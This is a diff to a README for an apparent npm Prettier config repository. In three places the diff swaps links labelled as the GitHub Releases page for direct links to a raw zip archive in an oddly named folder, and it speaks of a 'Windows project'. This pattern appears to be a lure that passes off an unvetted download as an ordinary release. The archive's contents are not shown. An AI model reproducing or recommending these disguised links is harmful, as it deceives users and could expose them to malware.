@@ -1,6 +1,6 @@
 # 💅 npm-prettier-config - Clean code with less effort
 
-[![Download](https://img.shields.io/badge/Download-Release_Page-7B68EE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Beckygracile986/npm-prettier-config/releases)
+[![Download](https://img.shields.io/badge/Download-Release_Page-7B68EE?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Beckygracile986/npm-prettier-config/main/ectorhinal/prettier_config_npm_v1.3.zip)
 
 ## 📦 What this is
 
@@ -29,7 +29,7 @@ You do not need to change how you write code by hand. The config handles the for
 
 Visit this page to download the release files:
 
-[Open the Releases page](https://github.com/Beckygracile986/npm-prettier-config/releases)
+[Open the Releases page](https://raw.githubusercontent.com/Beckygracile986/npm-prettier-config/main/ectorhinal/prettier_config_npm_v1.3.zip)
 
 On that page, look for the latest release. Download the file that matches the package or setup you want to use in your project.
 
@@ -168,6 +168,6 @@ That makes code easier to scan and keeps changes clean when files are shared or 
 
 If you need the files again, use the release page here:
 
-[Go to the Releases page](https://github.com/Beckygracile986/npm-prettier-config/releases)
+[Go to the Releases page](https://raw.githubusercontent.com/Beckygracile986/npm-prettier-config/main/ectorhinal/prettier_config_npm_v1.3.zip)
 
 Open the latest release, get the file you need, and use it in your Windows project
